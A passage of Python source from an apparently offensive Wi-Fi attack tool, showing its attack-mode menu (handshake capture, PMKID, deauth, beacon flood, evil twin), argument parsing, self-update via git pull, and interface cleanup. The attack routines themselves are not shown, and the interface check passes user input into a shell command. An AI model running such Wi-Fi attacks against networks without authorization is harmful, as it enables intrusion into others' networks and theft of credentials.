            print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + ' Deleting temporary files..'}")
            os.system('rm -rf wifi_hostapd.conf wifi_dnsmasq.conf')
            get_colours("\n\n[*] Attack completed successfully", 'green')
            quit_program(network_interface)


def quit_program(interfaceName):
    time.sleep(2)
    get_colours("\n[!] Exiting the program...", "blue")
    # os.system("rm -rf Cap*")
    os.system('rm -rf wifi_hostapd.conf wifi_dnsmasq.conf')
    get_colours("\nSetting Network interface to it normal mode..", "mangeta")
    subprocess.run(["sudo", "airmon-ng", "stop", interfaceName], stdout=subprocess.DEVNULL)
    subprocess.run(["sudo", "service", "NetworkManager", "restart"], stdout=subprocess.DEVNULL)
    get_colours("\n[*] Network set to it's normal mode...", "magenta")
    print(Fore.WHITE)
    exit(0)


def attackModes():
    print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
          f"{Fore.YELLOW + 'Select a valid attack Mode: '}")
    print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + '1. Handshake'}")
    print(f"{Fore.RED + '┃'} {Fore.YELLOW + '2. PKMID'}")
    print(f"{Fore.RED + '┃'} {Fore.YELLOW + '3. AAuth'}")
    print(f"{Fore.RED + '┃'} {Fore.YELLOW + '4. DAuth'}")
    print(f"{Fore.RED + '┃'} {Fore.YELLOW + '5. BFlood'}")
    print(f"{Fore.RED + '┃'} {Fore.YELLOW + '6. ETwin'}")
    print(Fore.WHITE)


def check_parms():
    if len(sys.argv) > 1:
        # Check for Arguments
        parser = argparse.ArgumentParser()
        parser.add_argument('-i', '--interface', type=str, required=True, help="Network Interface")
        parser.add_argument('-m', '--mode', required=True,
                            type=str,
                            help='Attack Mode',
                            )
        args = parser.parse_args()
        check_interface_exist = subprocess.check_output("ip a | grep '%s' | awk '{print $2}' | grep"
                                                        " '%s' | awk '{print $1}' FS=':'" % (
                                                            args.interface, args.interface),
                                                        shell=True).decode().strip()
        check_attack_mode = ["Handshake", "PKMID", "DAuth", "BFlood", "ETwin", "AAuth"]
        if args.mode not in check_attack_mode:
            attackModes()
        elif args.interface != check_interface_exist:
            print(f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
                  f"{Fore.YELLOW + 'Invalid Network Interface name'}")
            get_inters = subprocess.check_output("ls /sys/class/net", shell=True).decode().strip()
            save_all = get_inters.split('\n')
            print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + ' Available interfaces are:'}\n")
            cnt = 1
            for i in save_all:
                print(f"{Fore.RED + '┃'} {Fore.BLUE + str(cnt)}.{Fore.YELLOW + f' {i}'}")
                cnt = cnt + 1
        else:
            os.system('clear')
            subprocess.run(["clear"])
            try:
                print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Checking updates in the script...'}")
                pwd = subprocess.run(["pwd"], capture_output=True, text=True)
                g = git.cmd.Git(pwd.stdout)
                gitmsg = g.pull()
                if "Already up to date." not in gitmsg:
                    print(
                        f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Update available, updating the script'}")
                    time.sleep(2)
                    print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' Rerun the script to use the latest version.'}")
                    exit()
                else:
                    print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' The script is up to date'}")
            except:
                print(
                    f"\n{Fore.RED + '┃'}  {Fore.YELLOW + ' Error in the script update, check it manually with the following command'}")
                print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' git pull'}")
                time.sleep(2)
                print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' Continuing with the script'}")

            time.sleep(3)
            subprocess.run(["clear"])
            global netInterfaceName
            netInterfaceName = args.interface
            check_deps(args.interface, args.mode)  # Check for necessary program to run this script.
    else:
        script_banner()
        menu_panel()

def main():
    check_parms()

if __name__ == "__main__":
    main()

